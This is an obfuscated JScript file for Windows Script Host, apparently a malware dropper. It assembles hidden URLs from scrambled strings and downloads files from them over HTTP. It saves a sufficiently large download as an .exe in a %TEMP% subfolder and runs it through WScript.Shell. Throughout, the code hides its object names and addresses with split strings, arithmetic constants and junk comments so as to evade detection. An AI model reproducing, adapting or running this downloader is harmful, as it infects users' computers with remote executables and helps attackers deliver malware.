
function DeCsUcPeD(IOFaOaKNuWb) {
var AdkaPveU = "tuJT Ws xVCmUFm cri pt.S iianEw hell".split(" ");
var ebTLrFDx = WScript.CreateObject(AdkaPveU[1] + AdkaPveU[3] + AdkaPveU[4] + AdkaPveU[6]);
ebTLrFDx.Run(IOFaOaKNuWb, 0x1, 0x0);
}
function LmLtZAKIB(mSunK,tjnlz,JhPKZ,ndXl) {
var jHDXF = "jKyCuq Cld pt.Shell wKsgNht Scri  %TE MP% \\".split(" ");
var Ruc=((1)?"W" + jHDXF[4]:"")+jHDXF[2];
var ZC = WScript.CreateObject(Ruc);
return ZC.ExpandEnvironmentStrings(jHDXF[6]+jHDXF[7]+jHDXF[8]);
}
function bOYbrfeQ() {
var sXZseWu = "Sc dRRYGQI r KLZxRhdTT ipting FIbQASq yfx ile reLHvKSAZsPRwz System iX yYxVZ Obj OONhLR ect kKHGxzf".split(" ");
return sXZseWu[0] + sXZseWu[2] + sXZseWu[4] + ".F" + sXZseWu[7] + sXZseWu[9] + sXZseWu[12] + sXZseWu[14];
}
function yYPR(hIZSM) {
tfUwZze = WScript.CreateObject(hIZSM);
return tfUwZze
}
function HEzs(mTBhn,fiuCw) {
mTBhn.write(fiuCw);
}
function CsTA(mfaxg) {
mfaxg.open();
}
function hAJh(irgMZ,mcIap) {
irgMZ.saveToFile(mcIap,154-152);
}
function XbvZ(gxRAQ,MnYdv,QEarV) {
gxRAQ.open(QEarV,MnYdv,false);
}
function TuCF(eGfNz) {
if (eGfNz == 800-600){return true;} else {return false;}
}
function OvIe(TfLic) {
if (TfLic > 186132-512){return true;} else {return false;}
}
function nXrH(yWHlS) {
var KZhCD="";
O=(202-202);
while(true) {
if (O >= yWHlS.length) {break;}
if (O % (113-111) != (603-603)) {
KZhCD += yWHlS.substring(O, O+(530-529));
}
O++;
}
return KZhCD;
}
function PMjd(FELLa) {
var tNxoczMn=["\x73\x65\x6E\x64"];
FELLa[tNxoczMn[0]]();
}
function HaFv(CjJRk) {
return CjJRk.status;
}
function XQtuB(ixosdV) {
return new ActiveXObject(ixosdV);
}
function zMNrtwU(Pbpr) {
return Pbpr.responseBody;
}
function bbfqQjXi(pke) {
return pke.size;
}
var Th="1gZrzeme2tfiLnzgQsNjGaAmZamjCcaaofRfR.ocHopmY/s8C0ax6f4GLhH?1 2hwevlql5ommei9s7tsevrVbpiKzzn0eBswqLq7.EcuoSmS/Y8T0MxXfUGgh4?2 9?6 u?Z Y?";
var zF = nXrH(Th).split(" ");
var SNZfZq = ". dJxsFV e rOzuAGuA xe xfGh".split(" ");
var f = [zF[0].replace(new RegExp(SNZfZq[5],'g'), SNZfZq[0]+SNZfZq[2]+SNZfZq[4]),zF[1].replace(new RegExp(SNZfZq[5],'g'), SNZfZq[0]+SNZfZq[2]+SNZfZq[4]),zF[2].replace(new RegExp(SNZfZq[5],'g'), SNZfZq[0]+SNZfZq[2]+SNZfZq[4]),zF[3].replace(new RegExp(SNZfZq[5],'g'), SNZfZq[0]+SNZfZq[2]+SNZfZq[4]),zF[4].replace(new RegExp(SNZfZq[5],'g'), SNZfZq[0]+SNZfZq[2]+SNZfZq[4])];
var sBD = LmLtZAKIB("Hjxy","QHPcI","ZAAUmu","qPbNEJj");
var OAi = XQtuB(bOYbrfeQ());
var rFpKIN = ("nJrkPHR \\").split(" ");
var Uboi = sBD+rFpKIN[0]+rFpKIN[1];
try{
OAi.CreateFolder(Uboi);
}catch(yZXQTw){
};
var HOS = ("2.XMLHTTP upvSEAt AfebE XML ream St nxWCvpXl AD LjcOPbo O zVsU D").split(" ");
var lS = true  , SDRr = HOS[7] + HOS[9] + HOS[11];
var Mi = yYPR("MS"+HOS[3]+(525505, HOS[0]));
var mpH = yYPR(SDRr + "B." + HOS[5]+(890580, HOS[4]));
var HAr = 0;
var d = 1;
var SSDlArT = 755961;
var F=HAr;
while (true)  {
if(F>=f.length) {break;}
var CB = 0;
var RMB = ("ht" + " fVYVNzN tp YOfQm bUaMhfxZ :// AxbCbJz .e xe G ET").split(" ");
try  {
var sDAvz=RMB[372-372]+RMB[526-524]+RMB[668-663];
XbvZ(Mi,sDAvz+f[F]+d, RMB[9]+RMB[10]); PMjd(Mi); if (TuCF(HaFv(Mi)))  {      
CsTA(mpH); mpH.type = 1; HEzs(mpH,zMNrtwU(Mi)); if (OvIe(bbfqQjXi(mpH)))  {
CB = 1;mpH.position=0;hAJh(mpH,/*Qy7z100wiwl*/Uboi/*2aNU36o9hM*/+SSDlArT+RMB[7]+RMB[8]); try  {
if (((new Date())>0,7199266888)) {
DeCsUcPeD(Uboi+SSDlArT+/*qhAw13cEAY*/RMB[7]+RMB[8]/*gD4J217O1w*/); 
break;
}
}
catch (Br)  {
}; 
}; mpH.close(); 
}; 
if (CB == 1)  {
HAr = F; break; 
}; 
}
catch (Br)  { 
}; 
F++;
}; 

